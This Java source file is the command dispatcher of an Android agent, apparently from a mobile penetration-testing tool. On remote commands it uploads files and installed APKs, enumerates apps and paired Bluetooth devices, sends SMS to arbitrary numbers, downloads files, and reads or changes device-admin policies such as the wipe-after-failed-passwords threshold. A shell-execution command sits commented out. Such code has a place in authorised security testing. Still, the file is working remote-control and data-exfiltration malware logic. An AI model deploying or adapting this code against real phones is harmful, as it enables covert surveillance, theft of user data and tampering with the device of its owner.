package com.shevirah.androidagent;
import java.util.Set;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import java.util.List;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import static android.text.TextUtils.isEmpty;
import static com.shevirah.androidagent.Util.getMaximumTimeToLock;
import static com.shevirah.androidagent.Util.setMaximumTimeToLock;
import static com.shevirah.androidagent.Util.showToast;
import static java.lang.Integer.valueOf;

public class CommandHandlerService extends Service {
    private static final String TAG = "CommandHandler";

    //public static final String EXEC = "EXEC";
    //public static final String SHOW = "SHOW";
    //public static final String EXUP = "EXUP";

    public static final String UAPP = "UAPK";
    public static final String APKS = "APKS";
    public static final String SPAM = "SPAM";
    public static final String DELETE = "DELE";
    public static final String DOWNLOAD = "DOWN";
    public static final String UPLOAD = "UPLD";
    public static final String GETS = "GETS";
    public static final String SETS = "SETS";
    public static final String ATTACH = "ATTA";
    public static final String ENABLEBLUE = "EBLU";
    public static final String GETBLUE = "GBLU";
    public static final String SCANBLUE = "SBLU";
    public static final String EXTRA_MESSAGE = "message";
    public static final String SPLITTER = " ";

    @Override
    public void onStart(Intent intent, int startID) {
        try {
            onStart(intent.getStringExtra(EXTRA_MESSAGE));
        } catch (Exception e) {
            if (Const.DEBUG) Log.e(TAG, "", e);
        }
    }

    public final void onStart(String body) throws PackageManager.NameNotFoundException {
        if (isEmpty(body)) {
            throw new IllegalArgumentException("Arguments was empty");
        }

        String messageParts[] = body.split(SPLITTER);
        if (Const.DEBUG) Log.d(TAG, "Started command handler with argument message=[" + body + "]");

        if (messageParts.length < 2) {
            throw new IllegalArgumentException("Message does not have proper format " + body);
        }

        String function = messageParts[1];

        if (function.equals(UAPP)) {
            Intent intent = uappCommand(body, messageParts);
            startService(intent);
        } else if (function.equals(GETS)) {
            getPermission(body);
        } else if (function.equals(SETS)) {
            setPermission(messageParts);
        } else if (function.equals(DELETE)) {
            Intent intent = deleteCommand();
            startActivity(intent);
        }
        //else if (function.equals(SHOW)) {
        //    showCommand(messageParts);
        //}
        else if (function.equals(APKS)) {
            Intent intent = getAllInstalledApksCommand(body);
            startService(intent);
        } else if (function.equals(UPLOAD)) {
            Intent intent = uploadCommand(body, messageParts);
            startService(intent);
        } else if (function.equals(SPAM)) {
            Intent intent = spamCommand(messageParts);
            startService(intent);
        } else if (function.equals(ATTACH)) {
            Intent intent = attachCommand(body, messageParts);
            startService(intent);
        } else if (function.equals(DOWNLOAD)) {
            Intent intent = downloadCommand(messageParts);
            startService(intent);
        } else if (function.equals(GETBLUE)) {
                 Intent intent = getPairedDevices(body);
                startService(intent);
        } else if (function.equals(ENABLEBLUE)) {
                 enableBluetooth(body);
        } else if (function.equals(SCANBLUE)) {
                 Intent intent = scanBluetooth(body);
                startService(intent);
        }
        //else if (function.equals(EXEC)) {
        //    Intent intent = execCommand(messageParts);
        //    startService(intent);
        //}
        else {
            throw new IllegalArgumentException("Unknown function " + function);
        }
    }
       public final Intent scanBluetooth(String body) {
        Intent intent;
        BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        StringBuilder nearby = new StringBuilder();
        if (mBluetoothAdapter == null) {
                if (Const.DEBUG) Log.d(TAG, "Bluetooth is NOT supported");
                nearby.append("Bluetooth is not supported");
                String info = nearby.toString();
                 intent = new Intent(this, WebUploadService.class);
                        intent.putExtra(WebUploadService.EXTRA_STRING_TO_UPLOAD, info);
                        intent.putExtra(WebUploadService.EXTRA_COMMAND, body);
        }
	else {
              	if (!mBluetoothAdapter.isEnabled()) {
                         if (Const.DEBUG) Log.d(TAG, "Bluetooth is NOT enabled");
                        nearby.append("Bluetooth is not enabled. Use the EBLU command to attempt to enable it.");
                        String info = nearby.toString();
                         intent = new Intent(this, WebUploadService.class);
                        intent.putExtra(WebUploadService.EXTRA_STRING_TO_UPLOAD, info);
                        intent.putExtra(WebUploadService.EXTRA_COMMAND, body);
                }
                else
                {
                         if (Const.DEBUG) Log.d(TAG, "scanning bluetooth");
                         intent = new Intent(getApplicationContext(),BlueToothScanner.class);
                        intent.putExtra(BlueToothScanner.EXTRA_COMMAND, body);
                        //startService(intent);
                }

        }
	return intent;
   }
   private void enableBluetooth(String body) {
         BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        if (mBluetoothAdapter == null) {
                if (Const.DEBUG) Log.d(TAG, "Bluetooth is NOT supported");
        }
	else {
              	if (!mBluetoothAdapter.isEnabled()) {
                         if (Const.DEBUG) Log.d(TAG, "Bluetooth is NOT enabled");
                         Intent intent = new Intent(this, StagerActivity.class);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent.putExtra("command", body);
                        startActivity(intent);
                }
                else {
                      	if (Const.DEBUG) Log.d(TAG, "Bluetooth is enabled");
                }
        }
   }
      public final Intent getPairedDevices(String body) {
        BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        StringBuilder paired = new StringBuilder();
        if (mBluetoothAdapter == null) {
                if (Const.DEBUG) Log.d(TAG, "Bluetooth is NOT supported");
                paired.append("Bluetooth is not supported");
        }
	else {
              	if (!mBluetoothAdapter.isEnabled()) {
                         if (Const.DEBUG) Log.d(TAG, "Bluetooth is NOT enabled");
                        paired.append("Bluetooth is not enabled. Use the EBLU command to attempt to enable it.");
                }
                else
                {
                        paired.append("Paired Bluetooth Devices: ");
                        Set<BluetoothDevice> pairedDevices = mBluetoothAdapter.getBondedDevices();
                        if (pairedDevices.size() > 0) {
                                // There are paired devices. Get the name and address of each paired device.
                                for (BluetoothDevice device : pairedDevices) {
                                        String deviceName = device.getName();
                                        String deviceHardwareAddress = device.getAddress(); // MAC address
                                        paired.append(deviceName);
                                        paired.append(" ");
                                        paired.append(deviceHardwareAddress);
                                        paired.append(",");
                                }
                        }
                        else{
                                paired.append("No paired devices.");
                        }
                }
        }
                        String info = paired.toString();
                        if (Const.DEBUG) Log.d(TAG, info);
                        Intent intent = new Intent(this, WebUploadService.class);
                        intent.putExtra(WebUploadService.EXTRA_STRING_TO_UPLOAD, info);
                        intent.putExtra(WebUploadService.EXTRA_COMMAND, body);
                        return intent;

	}
    private void setPermission(String[] messageParts) {
        if (isAdmin()) {
            setsCommand(messageParts);
        } else {
            if (Const.DEBUG) Log.d(TAG, "Administration is NOT enabled");
        }
    }

    private void getPermission(String body) {
        if (isAdmin()) {
            Intent intent = getPermissionsCommand(body);
            startService(intent);
        } else {
            if (Const.DEBUG) Log.d(TAG, "Administration is NOT enabled");
            Intent intent = new Intent(this, StagerActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("command", body);
            startActivity(intent);
        }
    }

    //public Intent execCommand(String[] messageParts) {
    //    if (messageParts.length < 4) {
    //        throw new IllegalArgumentException("message format is bad.");
    //    }
    //
    //    StringBuilder command = new StringBuilder(messageParts[3]);
    //    for (int j = 4; j < messageParts.length; j++) {
    //        command.append(" ");
    //        command.append(messageParts[j]);
    //    }
    //    String downloaded = messageParts[2];
    //
    //    Intent intent = new Intent(this, Execute.class);
    //    intent.putExtra("command", command.toString());
    //    intent.putExtra("downloaded", downloaded);
    //    return intent;
    //}

    public Intent downloadCommand(String[] messageParts) {
        if (messageParts.length < 4) {
            throw new IllegalArgumentException("message format is bad");
        }

        String path = messageParts[2];
        String file = messageParts[3];
        Intent intent = new Intent(this, DownloadService.class);
        intent.putExtra("path", path);
        intent.putExtra("filename", file);
        return intent;
    }

    private Intent attachCommand(String body, String[] messageParts) {
        if (messageParts.length < 3) {
            throw new IllegalArgumentException("message format is bad");
        }
        Intent intent = new Intent(this, CheckinService.class);
        intent.putExtra(CheckinService.EXTRA_RETURN_METHOD, messageParts[2]);
        intent.putExtra(CheckinService.EXTRA_COMMAND, body);
        return intent;
    }

    public Intent spamCommand(String[] messageParts) {
        if (messageParts.length < 4) {
            throw new IllegalArgumentException("message format is bad");
        }

        String number = messageParts[2];
        String message = messageParts[3];
         for (int j = 4; j < messageParts.length; j++)
        {
                message += " ";
                message += messageParts[j];
        }

        Intent intent = new Intent(this, SMSService.class);
        intent.putExtra("number", number);
        intent.putExtra(EXTRA_MESSAGE, message.toString());
        return intent;
    }

    public final Intent uploadCommand(String body, String[] messageParts) {
        if (messageParts.length < 3) {
            throw new IllegalArgumentException("message format is bad");
        }

        Intent intent = new Intent(this, WebUploadService.class);
        intent.putExtra(WebUploadService.EXTRA_FILE, messageParts[2]);
        intent.putExtra(WebUploadService.EXTRA_COMMAND, body);
        return intent;
    }

    public final Intent getAllInstalledApksCommand(String body) {
        List<ApplicationInfo> appList =
                getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
        StringBuilder appsString =
                new StringBuilder(appList.size() * 10/*average size for package name*/);

        for (ApplicationInfo installedApplication : appList) {
            appsString.append(installedApplication.packageName).append("\n");
        }
        if (appsString.length() > 0) {
            appsString.deleteCharAt(appsString.length() - 1);
        }

        Intent intent = new Intent(this, WebUploadService.class);
        intent.putExtra(WebUploadService.EXTRA_STRING_TO_UPLOAD, appsString.toString());
        intent.putExtra(WebUploadService.EXTRA_COMMAND, body);
        return intent;
    }

    public final void showCommand(String[] messageParts) {
        StringBuilder message;

        if (messageParts.length >= 3) {
            message = new StringBuilder(messageParts[2]);
            for (int j = 3; j < messageParts.length; j++) {
                message.append(" ").append(messageParts[j]);
            }
        } else {
            message = new StringBuilder(
                    "This has been a Security Awareness Test by your Company. Please visit our website for more information.");
        }

        showToast(this, message);
    }

    public final Intent deleteCommand() {
        Intent intent = new Intent(Intent.ACTION_DELETE);
        intent.setData(Uri.parse("package:" + getPackageName()));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        return intent;
    }

    public final void setsCommand(String[] messageParts) {
        if (Const.DEBUG) Log.d(TAG, "setsCommand() ");
        if (messageParts.length < 4) {
            throw new IllegalArgumentException("message format is bad");
        }

        String toSet = messageParts[2].toLowerCase();
        String value = messageParts[3];

        DevicePolicyManager manager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName componentName = new ComponentName(this, AdminReceiver.class);

        if (toSet.equals("maximumfailedpasswordsforwipe")) {
            manager.setMaximumFailedPasswordsForWipe(componentName, valueOf(value));
        } else if (toSet.equals("maximumtimetolock")) {
            setMaximumTimeToLock(getContentResolver(), Integer.valueOf(value));
        } else if (toSet.equals("passwordexpirationtimeout")) {
            manager.setPasswordExpirationTimeout(componentName, Long.valueOf(value));
        } else if (toSet.equals("passwordhistorylength")) {
            manager.setPasswordHistoryLength(componentName, valueOf(value));
        } else if (toSet.equals("passwordminimumlength")) {
            manager.setPasswordMinimumLength(componentName, valueOf(value));
        } else if (toSet.equals("passwordminimumletters")) {
            manager.setPasswordMinimumLetters(componentName, valueOf(value));
        } else if (toSet.equals("passwordminimumlowercase")) {
            manager.setPasswordMinimumLowerCase(componentName, valueOf(value));
        } else if (toSet.equals("passwordminimumuppercase")) {
            manager.setPasswordMinimumUpperCase(componentName, valueOf(value));
        } else if (toSet.equals("passwordminimumsymbols")) {
            manager.setPasswordMinimumSymbols(componentName, valueOf(value));
        } else if (toSet.equals("passwordminimumnumeric")) {
            manager.setPasswordMinimumNumeric(componentName, valueOf(value));
        } else if (toSet.equals("passwordminimumnonletter")) {
            manager.setPasswordMinimumNonLetter(componentName, valueOf(value));
        } else if (toSet.equals("passwordquality")) {
            manager.setPasswordQuality(componentName, valueOf(value));
        } else if (toSet.equals("storageencryption")) {
            manager.setStorageEncryption(componentName, Boolean.valueOf(value));
        } else if (toSet.equals("cameradisabled")) {
            manager.setCameraDisabled(componentName, Boolean.valueOf(value));
        }
    }

    public final boolean isAdmin() {
        DevicePolicyManager m = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        return m.isAdminActive(new ComponentName(this, AdminReceiver.class));
    }

    public final Intent getPermissionsCommand(String body) {
        DevicePolicyManager manager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName componentName = new ComponentName(this, AdminReceiver.class);

        int fails = manager.getMaximumFailedPasswordsForWipe(componentName);
        boolean CameraDisabled = manager.getCameraDisabled(componentName);
        long MaximumTimeToLock = getMaximumTimeToLock(getContentResolver());
        long PasswordExpirationTimeout = manager.getPasswordExpirationTimeout(componentName);
        int PasswordHistoryLength = manager.getPasswordHistoryLength(componentName);
        int PasswordMinimumLength = manager.getPasswordMinimumLength(componentName);
        int PasswordMinimumLetters = manager.getPasswordMinimumLetters(componentName);
        int PasswordMinimumLowerCase = manager.getPasswordMinimumLowerCase(componentName);
        int PasswordMinimumNonLetter = manager.getPasswordMinimumNonLetter(componentName);
        int PasswordMinimumNumeric = manager.getPasswordMinimumNumeric(componentName);
        int PasswordMinimumSymbols = manager.getPasswordMinimumSymbols(componentName);
        int PasswordMinimumUpperCase = manager.getPasswordMinimumUpperCase(componentName);
        int PasswordQuality = manager.getPasswordQuality(componentName);
        int StorageEncryptionStatus = manager.getStorageEncryptionStatus();

        StringBuilder facts = new StringBuilder();
        facts.append("Maximum Failed Password Attempts: ")
                .append(Integer.toString(fails))
                .append("\nCamera Disabled: ")
                .append(Boolean.toString(CameraDisabled))
                .append("\nMaximum Time To Lock: ")
                .append(Long.toString(MaximumTimeToLock))
                .append("\nPassword Expiration Timeout: ")
                .append(Long.toString(PasswordExpirationTimeout))
                .append("\nPassword History Length: ")
                .append(Integer.toString(PasswordHistoryLength))
                .append("\nPassword Minimum Letters: ")
                .append(Integer.toString(PasswordMinimumLetters))
                .append("\nPassword Minimum Lower Case: ")
                .append(Integer.toString(PasswordMinimumLowerCase))
                .append("\nPassword Minimum Non Letter: ")
                .append(Integer.toString(PasswordMinimumNonLetter))
                .append("\nPassword Minimum Numeric: ")
                .append(Integer.toString(PasswordMinimumNumeric))
                .append("\nPassword Minimum Symbols: ")
                .append(Integer.toString(PasswordMinimumSymbols))
                .append("\nPassword Minimum Upper Case: ")
                .append(Integer.toString(PasswordMinimumUpperCase))
                .append("\nPassword Quality: ")
                .append(Integer.toString(PasswordQuality))
                .append("\nPassword Minimum Length: ")
                .append(Integer.toString(PasswordMinimumLength))
                .append("\nStorage Encryption Status: ")
                .append(Integer.toString(StorageEncryptionStatus));

        String info = facts.toString();
        if (Const.DEBUG) Log.d(TAG, info);

        Intent intent = new Intent(this, WebUploadService.class);
        intent.putExtra(WebUploadService.EXTRA_STRING_TO_UPLOAD, info);
        intent.putExtra(WebUploadService.EXTRA_COMMAND, body);
        return intent;
    }

    public final Intent uappCommand(String body, String[] messageParts)
            throws PackageManager.NameNotFoundException {
        if (messageParts.length < 3) {
            throw new IllegalArgumentException("message format is bad");
        }

        ApplicationInfo info = getPackageManager().getApplicationInfo(messageParts[2], 0);

        Intent intent = new Intent(this, WebUploadService.class);
        intent.putExtra(WebUploadService.EXTRA_FILE, info.sourceDir);
        intent.putExtra(WebUploadService.EXTRA_COMMAND, body);
        return intent;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // is not bindable
        return null;
    }
}


